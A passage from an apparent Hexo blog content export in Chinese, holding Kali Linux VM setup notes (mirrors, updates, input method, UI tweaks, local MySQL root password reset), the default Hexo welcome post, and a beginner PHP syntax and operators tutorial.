http://mirrors.zju.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.zju.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>

<p>不懂vim语法的按以下步骤来</p>
<ol>
<li><p>全选删除原本的内容</p>
<p> 按<strong>esc键</strong>后，先按 <strong>g g</strong>（到达顶部），然后再按 <strong>d G</strong>(区分大小写！！！)</p>
</li>
<li><p>复制以上内容，右键粘贴</p>
</li>
<li><p>保存退出</p>
<p> 按<strong>esc键</strong>后，同时按住<strong>shift</strong>键和英文:键，再输入wq</p>
</li>
</ol>
<h2 id="系统优化"><a href="#系统优化" class="headerlink" title="系统优化"></a><strong>系统优化</strong></h2><h3 id="1-设置root账户密码"><a href="#1-设置root账户密码" class="headerlink" title="1.设置root账户密码"></a>1.设置root账户密码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">sudo passwd root</span><br></pre></td></tr></table></figure>

<h3 id="2-设置禁止休眠"><a href="#2-设置禁止休眠" class="headerlink" title="2.设置禁止休眠"></a>2.设置禁止休眠</h3><ul>
<li>打开左上角kali图标</li>
<li>点击<code>settings(设置)</code></li>
<li>点击进入<code>power Manger(电源管理器)</code></li>
<li>在<code>Power Manager</code> 选择—&gt; <code>display(显示)</code><br>  把使用电池和插入电源下的依次把<code>Blank after、Put to sleep after和Switch off after</code> 全部设置成为 <code>Never</code></li>
</ul>
<h3 id="3-软件数据库更新："><a href="#3-软件数据库更新：" class="headerlink" title="3.软件数据库更新："></a>3.软件数据库更新：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">apt-get update</span><br></pre></td></tr></table></figure>

<h3 id="4-软件更新："><a href="#4-软件更新：" class="headerlink" title="4.软件更新："></a>4.软件更新：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">apt-get upgrade</span><br></pre></td></tr></table></figure>

<h3 id="5-系统更新："><a href="#5-系统更新：" class="headerlink" title="5.系统更新："></a>5.系统更新：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">apt-get dist-upgrade</span><br></pre></td></tr></table></figure>

<h2 id="安装中文输入法"><a href="#安装中文输入法" class="headerlink" title="安装中文输入法"></a><u><strong>安装中文输入法</strong></u></h2><ol>
<li><p>更新包管理器的软件包列表：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装<code>fcitx</code>输入法框架：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">sudo apt-get install fcitx</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装<code>fcitx-googlepinyin</code>谷歌拼音输入法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">sudo apt-get install fcitx-googlepinyin</span><br></pre></td></tr></table></figure></li>
</ol>
<p><code>ctrl</code>+<code>space(空格)</code>切换输入法</p>
<h2 id="界面美化"><a href="#界面美化" class="headerlink" title="界面美化"></a><strong>界面美化</strong></h2><h3 id="1-整体字体放大"><a href="#1-整体字体放大" class="headerlink" title="1.整体字体放大"></a>1.整体字体放大</h3><ul>
<li>打开左上角kali图标</li>
<li>点击<strong>设置</strong>进入<strong>外观</strong></li>
<li>选择<strong>字体</strong>，修改<strong>DPI</strong></li>
</ul>
<h3 id="1-桌面图标大小"><a href="#1-桌面图标大小" class="headerlink" title="1.桌面图标大小"></a>1.桌面图标大小</h3><ul>
<li>桌面<strong>右键</strong>选择<strong>桌面设置</strong></li>
<li>选择<strong>图标</strong>，调节<strong>图标大小</strong>完成对桌面图标的调节。（这步也可以设置图标下的字体 自定义大小）</li>
</ul>
<h3 id="2-菜单栏大小以及位置"><a href="#2-菜单栏大小以及位置" class="headerlink" title="2.菜单栏大小以及位置"></a>2.菜单栏大小以及位置</h3><ul>
<li>在菜单栏空白处右键—选择<strong>面板</strong>再点击<strong>面板首选项</strong></li>
<li>打开面板后选择<strong>显示</strong>—<strong>尺寸</strong>—调节<strong>行大小</strong></li>
<li><strong>关闭锁定面板</strong>，可拖动作用两侧的小点将面板放置于最下侧</li>
</ul>
<h3 id="3-终端字体"><a href="#3-终端字体" class="headerlink" title="3.终端字体"></a>3.终端字体</h3><ul>
<li>打开<strong>终端</strong>再点击左上角<strong>文件</strong>点击<strong>参数设置</strong></li>
<li>打开<strong>设置界面</strong>，<strong>界面设置</strong>—调节<strong>字体</strong>大小</li>
</ul>
<h3 id="4-系统字体"><a href="#4-系统字体" class="headerlink" title="4.系统字体"></a>4.系统字体</h3><ul>
<li>打开左上角kali图标</li>
<li>点击<strong>设置</strong>进入<strong>外观</strong></li>
<li>选择<strong>字体</strong>，修改<strong>默认字体</strong>和<strong>默认等宽字体</strong></li>
</ul>
<h3 id="4-窗口字体"><a href="#4-窗口字体" class="headerlink" title="4.窗口字体"></a>4.窗口字体</h3><ul>
<li>打开左上角kali图标</li>
<li>点击<strong>设置</strong>进入<strong>窗口管理器</strong></li>
<li>选择<strong>样式</strong>修改<strong>标题字体</strong></li>
</ul>
<h2 id="kali-mysql登录问题"><a href="#kali-mysql登录问题" class="headerlink" title="kali mysql登录问题"></a>kali mysql登录问题</h2><p>不知用户名和密码（用root试过不行），我们自行更改root用户的密码</p>
<p>使用 <strong><code>sudo</code></strong> 登录 MySQL：<code>sudo mysql</code></p>
<p>确定数据库版本</p>
<p><code>SELECT VERSION();</code></p>
<p><strong>MariaDB版本</strong></p>
<p>使用以下 SQL 语法来修改 <code>root</code> 用户的密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SET PASSWORD FOR &#x27;root&#x27;@&#x27;localhost&#x27; = PASSWORD(&#x27;your_new_password&#x27;);</span><br><span class="line">或 </span><br><span class="line">UPDATE mysql.user SET password = PASSWORD(&#x27;your_new_password&#x27;) WHERE user = &#x27;root&#x27; AND host = &#x27;localhost&#x27;;</span><br></pre></td></tr></table></figure>

<p><strong>MySQL版本</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;your_new_password&#x27;;</span><br></pre></td></tr></table></figure>

<p>刷新权限</p>
<p><code>FLUSH PRIVILEGES;</code></p>
<p>如果以上方法仍然不起作用，可能是由于权限问题。可以检查 <code>root</code> 用户的权限配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT user, host, authentication_string, plugin FROM mysql.user WHERE user=&#x27;root&#x27;;</span><br></pre></td></tr></table></figure>

<p>确认 <code>root</code> 用户是否具有正确的权限，并且插件是否配置为 **<code>mysql_native_password</code>**，或者可以通过 <strong><code>unix_socket</code></strong> 来进行身份验证</p>
<p>0.0.0.0</p>
]]></content>
      <categories>
        <category>kali虚拟机</category>
      </categories>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2024/10/10/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>PHP</title>
    <url>/2025/02/05/php/</url>
    <content><![CDATA[<h1 id="PHP-超文本预处理器，服务器端脚本语言"><a href="#PHP-超文本预处理器，服务器端脚本语言" class="headerlink" title="PHP(超文本预处理器，服务器端脚本语言)"></a>PHP(超文本预处理器，服务器端脚本语言)</h1><h2 id="PHP基础"><a href="#PHP基础" class="headerlink" title="PHP基础"></a>PHP基础</h2><h3 id="PHP功能"><a href="#PHP功能" class="headerlink" title="PHP功能"></a>PHP功能</h3><ul>
<li>PHP 可以生成<strong>动态页面内容</strong></li>
<li>PHP 可以创建、打开、读取、写入、关闭服务器上的文件</li>
<li>PHP 可以收集表单数据</li>
<li>PHP 可以<strong>发送和接收 cookies</strong></li>
<li>PHP 可以<strong>添加、删除、修改您的数据库中的数据</strong></li>
<li>PHP 可以限制用户访问您的网站上的一些页面</li>
<li>PHP 可以加密数据</li>
</ul>
<p>通过 PHP，不再限于输出 HTML，还可以输出图像、PDF 文件，甚至 Flash 电影，还可以输出任意的文本，比如 XHTML 和 XML</p>
<h3 id="PHP语法"><a href="#PHP语法" class="headerlink" title="PHP语法"></a>PHP语法</h3><p>PHP 脚本可以放在文档中的任何位置。PHP 脚本以 <strong><?php** 开始，以 **?></strong> 结束，每个代码行都必须以分号结束，</p>
<p>有两种在浏览器输出文本的基础指令：<strong>echo</strong> 和 <strong>print</strong>，有两种注释方法：**&#x2F;&#x2F;** 和 <strong>&#x2F;* *&#x2F;</strong></p>
<h3 id="PHP变量"><a href="#PHP变量" class="headerlink" title="PHP变量"></a>PHP变量</h3><p>变量以 $ 符号开始，后面跟着变量的名称，变量名只能包含字母、数字以及下划线（A-z、0-9 和 _ ），必须以字母或者下划线字符开始</p>
<p>PHP 没有声明变量的命令，在第一次赋值时就被创建</p>
<h4 id="PHP-global-关键字"><a href="#PHP-global-关键字" class="headerlink" title="PHP global 关键字"></a>PHP global 关键字</h4><p>global 关键字用于函数内访问全局变量，在函数内调用函数外定义的全局变量，我们需要在函数中的变量前加上 global 关键字</p>
<p>PHP 将所有全局变量存储在一个名为 $GLOBALS[<em>index</em>] 的数组中。 <em>index</em> 保存变量的名称。这个数组可以在函数内部访问，也可以直接用来更新全局变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">global $x,$y;  </span><br><span class="line">$y=$x+$y;</span><br><span class="line">//$GLOBALS[&#x27;y&#x27;]=$GLOBALS[&#x27;x&#x27;]+$GLOBALS[&#x27;y&#x27;];</span><br></pre></td></tr></table></figure>

<h4 id="Static-作用域"><a href="#Static-作用域" class="headerlink" title="Static 作用域"></a>Static 作用域</h4><p>在第一次声明变量时使用 <strong>static</strong> 关键字，可以使得当一个函数完成时，某个局部变量不会被删除</p>
<p>即每次调用函数时，该变量将会保留着函数前一次被调用时的值。</p>
<p>注：该变量仍然是函数的局部变量</p>
<h3 id="PHP-echo-和-print-语句"><a href="#PHP-echo-和-print-语句" class="headerlink" title="PHP echo 和 print 语句"></a>PHP echo 和 print 语句</h3><h4 id="echo于print区别"><a href="#echo于print区别" class="headerlink" title="echo于print区别"></a>echo于print区别</h4><p>echo - 可以输出一个或多个字符串，且输出速度比print快</p>
<p>print - 只允许输出一个字符串，返回值总为 1</p>
<h4 id="echo语句"><a href="#echo语句" class="headerlink" title="echo语句"></a>echo语句</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;&lt;h2&gt;PHP 很有趣!&lt;/h2&gt;&quot;;</span><br><span class="line">echo &quot;Hello world!&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;我要学 PHP!&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;这是一个&quot;, &quot;字符串，&quot;, &quot;使用了&quot;, &quot;多个&quot;, &quot;参数。&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$txt1=&quot;学习 PHP&quot;;</span><br><span class="line">$txt2=&quot;RUNOOB.COM&quot;;</span><br><span class="line">$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);</span><br><span class="line"> </span><br><span class="line">echo $txt1;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;在 $txt2 学习 PHP &quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;我车的品牌是 &#123;$cars[0]&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="print语句"><a href="#print语句" class="headerlink" title="print语句"></a>print语句</h4><p>与上述例子基本一致，下例不适用print</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;这是一个&quot;, &quot;字符串，&quot;, &quot;使用了&quot;, &quot;多个&quot;, &quot;参数。&quot;;</span><br></pre></td></tr></table></figure>

<h3 id="PHP-EOF-heredoc"><a href="#PHP-EOF-heredoc" class="headerlink" title="PHP EOF(heredoc)"></a>PHP EOF(heredoc)</h3><p><strong>PHP EOF</strong>(heredoc)是一种<strong>在命令行shell</strong>（如sh、csh、ksh、bash、PowerShell和zsh）和<strong>程序语言</strong>（像Perl、PHP、Python和Ruby）里<strong>定义一个字符串的方法</strong></p>
<p>以 <strong>&lt;&lt;&lt;EOF</strong> 开始标记开始，以 <strong>EOF</strong> 结束标记结束，**结束标识必须顶格独自占一行(即必须从行首开始，前后不能衔接任何空白和字符)**，且在结束标记末尾要有分号</p>
<p>开始标记和结束标记相同，比如常用大写的 <strong>EOT、EOD、EOF</strong> 来表示，但是不只限于那几个(也可以用：JSON、<strong>HTML</strong>等)，开始标记和结束标记不在正文中出现</p>
<p>开始标识带单引号则不解释内嵌的变量和转义符号</p>
<p>在 heredoc 中，变量不需要用连接符 <strong>.</strong> 或 <strong>,</strong> 来拼接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &lt;&lt;&lt;EOF</span><br><span class="line">        &lt;h1&gt;我的第一个标题&lt;/h1&gt;</span><br><span class="line">        &lt;p&gt;我的第一个段落。&lt;/p&gt;</span><br><span class="line">EOF;</span><br><span class="line">// 结束需要独立一行且前后不能空格</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$name=&quot;runoob&quot;;</span><br><span class="line">$a= &lt;&lt;&lt;EOF</span><br><span class="line">        &quot;abc&quot;$name</span><br><span class="line">        &quot;123&quot;</span><br><span class="line">EOF;</span><br><span class="line">// 结束需要独立一行且前后不能空格</span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="PHP数据类型"><a href="#PHP数据类型" class="headerlink" title="PHP数据类型"></a>PHP数据类型</h3><p>String（字符串）Integer（整型）Float（浮点型）Boolean（布尔型）Array（数组）Object（对象）NULL（空值）Resource（资源类型）</p>
<h4 id="PHP字符串"><a href="#PHP字符串" class="headerlink" title="PHP字符串"></a>PHP字符串</h4><p>一个字符串是一串字符的序列，可以将任何文本放在单引号和双引号中</p>
<h4 id="PHP整型"><a href="#PHP整型" class="headerlink" title="PHP整型"></a>PHP整型</h4><p>整数是一个没有小数的数字，整型可以用三种格式来指定：十进制， 十六进制（ 以 0x 为前缀）或八进制（前缀为 0）</p>
<h4 id="PHP布尔型"><a href="#PHP布尔型" class="headerlink" title="PHP布尔型"></a>PHP布尔型</h4><p>通常用于条件判断</p>
<h4 id="PHP数组"><a href="#PHP数组" class="headerlink" title="PHP数组"></a>PHP数组</h4><p>数组可以在一个变量中存储多个值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);</span><br></pre></td></tr></table></figure>

<h4 id="PHP对象（难理解）"><a href="#PHP对象（难理解）" class="headerlink" title="PHP对象（难理解）"></a>PHP对象（难理解）</h4><p>对象数据类型也可以用于存储数据</p>
<p>必须使用class关键字声明类对象。类是可以包含属性和方法的结构</p>
<h4 id="PHP-NULL值"><a href="#PHP-NULL值" class="headerlink" title="PHP NULL值"></a>PHP NULL值</h4><p>NULL 值表示变量没有值，可以通过设置变量值为 NULL 来清空变量数据</p>
<h4 id="PHP资源类型"><a href="#PHP资源类型" class="headerlink" title="PHP资源类型"></a>PHP资源类型</h4><p>PHP 资源 resource 是一种特殊变量，保存了到外部资源的一个引用</p>
<p>常见资源数据类型有打开文件、数据库连接、图形画布区域等</p>
<h3 id="PHP类型比较"><a href="#PHP类型比较" class="headerlink" title="PHP类型比较"></a>PHP类型比较</h3><blockquote>
<p>[!IMPORTANT]</p>
<ul>
<li>松散比较：使用两个等号 <strong>&#x3D;&#x3D;</strong> 比较，只比较值，不比较类型。</li>
<li>严格比较：用三个等号 <strong>&#x3D;&#x3D;&#x3D;</strong> 比较，除了比较值，也比较类型。</li>
</ul>
</blockquote>
<p><a href="https://www.runoob.com/php/php-types-comparisons.html">多种类型比较</a></p>
<h3 id="PHP常量"><a href="#PHP常量" class="headerlink" title="PHP常量"></a>PHP常量</h3><p>常量可以用 <strong>define()</strong> 函数或 <strong>const</strong> 关键字来定义</p>
<p>一旦定义，其值不能改变，可以在整个脚本的任何地方都可以使用，无需使用 <code>global</code> 关键字</p>
<h4 id="用-define-函数"><a href="#用-define-函数" class="headerlink" title="用 define() 函数"></a>用 <strong>define()</strong> 函数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bool define ( string $name , mixed $value [, bool $case_insensitive = false ] )</span><br></pre></td></tr></table></figure>

<p><strong>name：</strong>必选参数，常量名称，即标志符。</p>
<p><strong>value：</strong>必选参数，常量的值。</p>
<p><strong>case_insensitive</strong> ：可选参数，如果<strong>设置为 TRUE，该常量则大小写不敏感</strong>，默认是大小写敏感的。</p>
<p>如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">define(&quot;GREETING&quot;, &quot;欢迎访问 Runoob.com&quot;, true);</span><br></pre></td></tr></table></figure>

<h4 id="用const-关键字"><a href="#用const-关键字" class="headerlink" title="用const 关键字"></a>用<strong>const</strong> 关键字</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const CONSTANT_NAME = &quot;value&quot;;</span><br></pre></td></tr></table></figure>

<p>如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const SITE_URL = &quot;https://www.runoob.com&quot;;</span><br></pre></td></tr></table></figure>

<h4 id="预定义常量"><a href="#预定义常量" class="headerlink" title="预定义常量"></a>预定义常量</h4><p>PHP 提供了一些预定义常量，可以在脚本中直接使用。这些常量通常用于获取 PHP 的配置信息、版本信息等</p>
<ul>
<li><code>PHP_VERSION</code>：当前 PHP 解析器的版本。</li>
<li><code>PHP_OS</code>：服务器的操作系统。</li>
<li><code>PHP_INT_MAX</code>：最大的整数值。</li>
<li><code>E_ERROR</code>、<code>E_WARNING</code>、<code>E_PARSE</code> 等：错误报告级别</li>
</ul>
<h3 id="PHP字符串变量"><a href="#PHP字符串变量" class="headerlink" title="PHP字符串变量"></a>PHP字符串变量</h3><p>字符串变量用于存储并处理文本</p>
<h4 id="PHP-中的字符串变量"><a href="#PHP-中的字符串变量" class="headerlink" title="PHP 中的字符串变量"></a>PHP 中的字符串变量</h4><p>当赋一个文本值给变量时，记得给文本值加上单引号或者双引号。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$txt=&quot;Hello world!&quot;;</span><br><span class="line">echo $txt;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="PHP-并置运算符"><a href="#PHP-并置运算符" class="headerlink" title="PHP 并置运算符"></a>PHP 并置运算符</h4><p>并置运算符 (.) 用于把两个字符串值连接起来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$txt1=&quot;Hello world!&quot;;</span><br><span class="line">$txt2=&quot;What a nice day!&quot;;</span><br><span class="line">echo $txt1 . &quot; &quot; . $txt2;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>上面的代码中，我们已经使用了两次并置运算符。这是由于我们需要在两个字符串之间插入一个空格</p>
<h4 id="PHP-strlen-函数"><a href="#PHP-strlen-函数" class="headerlink" title="PHP strlen() 函数"></a>PHP strlen() 函数</h4><p>strlen() 函数返回字符串的长度（字节数）</p>
<h4 id="PHP-strpos-函数"><a href="#PHP-strpos-函数" class="headerlink" title="PHP strpos() 函数"></a>PHP strpos() 函数</h4><p>strpos() 函数用于在字符串内查找一个字符或一段指定的文本。</p>
<p>如果在字符串中找到匹配，该函数会返回第一个匹配的字符位置。如果未找到匹配，则返回 FALSE。</p>
<p><a href="https://www.runoob.com/php/php-ref-string.html">PHP 5 String 函数</a></p>
<h3 id="PHP运算符"><a href="#PHP运算符" class="headerlink" title="PHP运算符"></a>PHP运算符</h3><h4 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h4><table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">名称</th>
<th align="left">描述</th>
<th align="left">实例</th>
<th align="left">结果</th>
</tr>
</thead>
<tbody><tr>
<td align="left">x + y</td>
<td align="left">加</td>
<td align="left">x 和 y 的和</td>
<td align="left">2 + 2</td>
<td align="left">4</td>
</tr>
<tr>
<td align="left">x - y</td>
<td align="left">减</td>
<td align="left">x 和 y 的差</td>
<td align="left">5 - 2</td>
<td align="left">3</td>
</tr>
<tr>
<td align="left">x * y</td>
<td align="left">乘</td>
<td align="left">x 和 y 的积</td>
<td align="left">5 * 2</td>
<td align="left">10</td>
</tr>
<tr>
<td align="left">x &#x2F; y</td>
<td align="left">除</td>
<td align="left">x 和 y 的商</td>
<td align="left">15 &#x2F; 5</td>
<td align="left">3</td>
</tr>
<tr>
<td align="left">x % y</td>
<td align="left">模（除法的余数）</td>
<td align="left">x 除以 y 的余数</td>
<td align="left">5 % 2 10 % 8 10 % 2</td>
<td align="left">1 2 0</td>
</tr>
<tr>
<td align="left">-x</td>
<td align="left">设置负数</td>
<td align="left">取 x 的相反符号</td>
<td align="left"><code>&lt;?php $x = 2; echo -$x; ?&gt;</code></td>
<td align="left">-2</td>
</tr>
<tr>
<td align="left">~x</td>
<td align="left">取反</td>
<td align="left">x 取反，按二进制位进行”取反”运算。运算规则：<code>~1=-2;    ~0=-1;</code></td>
<td align="left"><code>&lt;?php $x = 2; echo ~$x; ?&gt;</code></td>
<td align="left">-3</td>
</tr>
<tr>
<td align="left">a . b</td>
<td align="left">并置</td>
<td align="left">连接两个字符串</td>
<td align="left">“Hi” . “Ha”</td>
<td align="left">HiHa</td>
</tr>
</tbody></table>
<p>整除运算符 **intdiv()**，该函数返回值为第一个参数除于第二个参数的值并取整（向下取整）</p>
<p><code>var_dump(intdiv(10, 3));</code>会输出<code>int(3)</code></p>
<blockquote>
<p>[!IMPORTANT]</p>
<p><code>var_dump()</code> 是一个非常有用的调试函数，用于输出变量的详细信息，包括数据类型和值</p>
</blockquote>
<h4 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h4><table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">等同于</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">x &#x3D; y</td>
<td align="left">x &#x3D; y</td>
<td align="left">左操作数被设置为右侧表达式的值</td>
</tr>
<tr>
<td align="left">x +&#x3D; y</td>
<td align="left">x &#x3D; x + y</td>
<td align="left">加</td>
</tr>
<tr>
<td align="left">x -&#x3D; y</td>
<td align="left">x &#x3D; x - y</td>
<td align="left">减</td>
</tr>
<tr>
<td align="left">x *&#x3D; y</td>
<td align="left">x &#x3D; x * y</td>
<td align="left">乘</td>
</tr>
<tr>
<td align="left">x &#x2F;&#x3D; y</td>
<td align="left">x &#x3D; x &#x2F; y</td>
<td align="left">除</td>
</tr>
<tr>
<td align="left">x %&#x3D; y</td>
<td align="left">x &#x3D; x % y</td>
<td align="left">模（除法的余数）</td>
</tr>
<tr>
<td align="left">a .&#x3D; b</td>
<td align="left">a &#x3D; a . b</td>
<td align="left">连接两个字符串</td>
</tr>
</tbody></table>
<h4 id="递增-递减运算符"><a href="#递增-递减运算符" class="headerlink" title="递增&#x2F;递减运算符"></a>递增&#x2F;递减运算符</h4><table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">名称</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">++ x</td>
<td align="left">预递增</td>
<td align="left">x 加 1，然后返回 x</td>
</tr>
<tr>
<td align="left">x ++</td>
<td align="left">后递增</td>
<td align="left">返回 x，然后 x 加 1</td>
</tr>
<tr>
<td align="left">– x</td>
<td align="left">预递减</td>
<td align="left">x 减 1，然后返回 x</td>
</tr>
<tr>
<td align="left">x –</td>
<td align="left">后递减</td>
<td align="left">返回 x，然后 x 减 1</td>
</tr>
</tbody></table>
<h4 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h4><table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">名称</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">x &#x3D;&#x3D; y</td>
<td align="left">等于</td>
<td align="left">如果 x 等于 y，则返回 true</td>
<td align="left">5&#x3D;&#x3D;8 返回 false</td>
</tr>
<tr>
<td align="left">x &#x3D;&#x3D;&#x3D; y</td>
<td align="left">绝对等于</td>
<td align="left">如果 x 等于 y，且它们类型相同，则返回 true</td>
<td align="left">5&#x3D;&#x3D;&#x3D;”5” 返回 false</td>
</tr>
<tr>
<td align="left">x !&#x3D; y</td>
<td align="left">不等于</td>
<td align="left">如果 x 不等于 y，则返回 true</td>
<td align="left">5!&#x3D;8 返回 true</td>
</tr>
<tr>
<td align="left">x &lt;&gt; y</td>
<td align="left">不等于</td>
<td align="left">如果 x 不等于 y，则返回 true</td>
<td align="left">5&lt;&gt;8 返回 true</td>
</tr>
<tr>
<td align="left">x !&#x3D;&#x3D; y</td>
<td align="left">不绝对等于</td>
<td align="left">如果 x 不等于 y，或它们类型不相同，则返回 true</td>
<td align="left">5!&#x3D;&#x3D;”5” 返回 true</td>
</tr>
<tr>
<td align="left">x &gt; y</td>
<td align="left">大于</td>
<td align="left">如果 x 大于 y，则返回 true</td>
<td align="left">5&gt;8 返回 false</td>
</tr>
<tr>
<td align="left">x &lt; y</td>
<td align="left">小于</td>
<td align="left">如果 x 小于 y，则返回 true</td>
<td align="left">5&lt;8 返回 true</td>
</tr>
<tr>
<td align="left">x &gt;&#x3D; y</td>
<td align="left">大于等于</td>
<td align="left">如果 x 大于或者等于 y，则返回 true</td>
<td align="left">5&gt;&#x3D;8 返回 false</td>
</tr>
<tr>
<td align="left">x &lt;&#x3D; y</td>
<td align="left">小于等于</td>
<td align="left">如果 x 小于或者等于 y，则返回 true</td>
<td align="left">5&lt;&#x3D;8 返回 true</td>
</tr>
</tbody></table>
<h4 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h4><table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">名称</th>
<th align="left">描述</th>
<th align="left">实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">x and y</td>
<td align="left">与</td>
<td align="left">如果 x 和 y 都为 true，则返回 true</td>
<td align="left">x&#x3D;6 y&#x3D;3 (x &lt; 10 and y &gt; 1) 返回 true</td>
</tr>
<tr>
<td align="left">x or y</td>
<td align="left">或</td>
<td align="left">如果 x 和 y 至少有一个为 true，则返回 true</td>
<td align="left">x&#x3D;6 y&#x3D;3 (x&#x3D;&#x3D;6 or y&#x3D;&#x3D;5) 返回 true</td>
</tr>
<tr>
<td align="left">x xor y</td>
<td align="left">异或</td>
<td align="left">如果 x 和 y 有且仅有一个为 true，则返回 true</td>
<td align="left">x&#x3D;6 y&#x3D;3 (x&#x3D;&#x3D;6 xor y&#x3D;&#x3D;3) 返回 false</td>
</tr>
<tr>
<td align="left">x &amp;&amp; y</td>
<td align="left">与</td>
<td align="left">如果 x 和 y 都为 true，则返回 true</td>
<td align="left">x&#x3D;6 y&#x3D;3 (x &lt; 10 &amp;&amp; y &gt; 1) 返回 true</td>
</tr>
<tr>
<td align="left">x || y</td>
<td align="left">或</td>
<td align="left">如果 x 和 y 至少有一个为 true，则返回 true</td>
<td align="left">x&#x3D;6 y&#x3D;3 (x&#x3D;&#x3D;5 || y&#x3D;&#x3D;5) 返回 false</td>
</tr>
<tr>
<td align="left">! x</td>
<td align="left">非</td>
<td align="left">如果 x 不为 true，则返回 true</td>
<td align="left">x&#x3D;6 y&#x3D;3 !(x&#x3D;&#x3D;y) 返回 true</td>
</tr>
</tbody></table>
